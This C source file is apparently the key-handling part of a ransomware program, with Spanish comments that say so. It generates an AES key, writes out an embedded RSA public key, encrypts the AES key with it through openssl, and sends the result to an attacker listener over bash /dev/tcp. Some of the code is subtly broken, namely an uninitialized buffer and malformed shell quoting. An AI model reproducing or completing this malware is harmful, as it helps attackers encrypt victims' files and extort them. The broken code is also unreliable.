#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

char * gen_aes(){
    static char aes[48];
    srand(time(NULL)); //Tener cuidado que con la semilla pueden calcular la key
    char dic[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for(int i=0; i<48; i++){
        aes[i] = dic[rand () % strlen(dic)];
    }
    //printf("%s\n",aes);
    return aes;
}

void end_file(char aes[]){
    //echo "texto ctm" | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc
    char command[100000]="echo -n '";
    strcat(command,aes);
    strcat(command,"' | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc");
    //printf("%s\n",command);
    system(command);
}

void send_file(char ip[], char port[]){
    char command[100000] = "bash -c 'base64 enviame.enc > /dev/tcp/";
    strcat(command,ip);
    strcat(command,"/'");
    strcat(command,port);
    //printf("%s",command);
    system(command);
}

void key_pub(int i){
    if(i == 1){
        //Creamos la llave publica
        system("echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUEyaU03cUhHdDlGUUwxSGVZbGRzRQpud2ZtQWhsYzNiZm1SYXhWQTA3WXJqZENWVFh5aGpLcTVjbjhpRThuRFdVRHdiclpLbkxJZTYzRzdMcFQ2TDhsCm9xQ2dIaWVFUFIzWnFYenVManIwWkNrVTljRkU4RTFvSlY3YmZMRW90SDVpWnBldVkwNkMxR3dXaTkrS2RyZjkKUjBKM2RwbGIxQkl4cnNBeGRpcStuVUhWQWVVSXBEZWZ2YWRKc0s5cGpVcGZ2c1VIN08yMTRTOENBekgxaXJ4WQplalFscXJHZFdYbHpiZVR6bG0rQlJsOVZveEwwNGxpb0tEanc1YzBkcFlyUC9NRnlzWnF5elpkcDNjdEx3UllOCjgxOCtoZUhnR1lvYWtXVFVPcWxoUVhaaCtPNm1lY3lhNWo2QmF4Y1hTTDdJYWNRYzUrUTlHS3psbTdGbE5wZ2EKUFFIS2JhU2JFaWZwQ0k2SXg0cC9sNDRaSlRwcTlWa3JVclpORGJTc1VGQ0lhVmFGa1h0R3pyRmNaTFZ1c0xhcQorWTlUVUYxdUt6SzRVeEFDK2hVOTJPK1p4VmhHVGcxWjk5Qmo0dmJLdkRDcjFZSFJKZWl6aXd3ZWhiNGkweGlhCks4ZnQzNWtyUWwrU2xrdDU3TXVXcmVmZGJ0RDBxdnZ3MHU2SCs2dGh0R1p2MmM0dmcrTVNLMnBkZFBXQzhJUGkKa1NISk94UjlCM1RtdzljT0JoTXZLb1VTSEhsNFJmem53N3Q0aHprMkZML0hUcGVlNHZQNjI2Q1ZMcUR5Y1lCZQp5TW85dERTQ0p6RTEzeXlkVFBOUzVTem1hdk5UbEFvTTZWS0o4VzdlcVhsb0o3VEdUdEplanpTSkRHQTIxZEd4CjhDUEZ1WXZ2MzAyVm5CN2QvdXJEYkg4Q0F3RUFBUT09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=' | base64 -d > clave.pub.pem");
    }else if(i == 0){
        //Eliminamos la llave publica
        system("rm clave.pub.pem");
    }
}

int main(){
    //Key AES para el cifrado de ficheros
    char key[48];
    strcat(key,gen_aes());
    //Key RSA Pub
    key_pub(1);
    //Creando fichero con informacion confidencial para enviar al dueño del ransomware
    end_file(key);
    //Enviando fichero confidencial
    send_file("127.0.0.1","4444");
    //Del RSA Pub
    key_pub(0);
}